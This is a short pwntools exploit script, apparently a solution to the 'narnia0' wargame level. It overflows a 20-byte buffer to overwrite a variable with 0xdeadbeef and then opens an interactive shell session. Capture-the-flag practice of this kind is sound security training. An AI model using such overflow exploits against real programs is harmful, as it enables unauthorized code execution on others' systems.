from pwn import *

p = process('./narnia0')

payload = b'a' * 20 + p32(0xdeadbeef)

print(p.recvuntil(b'your chance:', timeout=2).decode())

p.sendline(payload)

p.interactive()
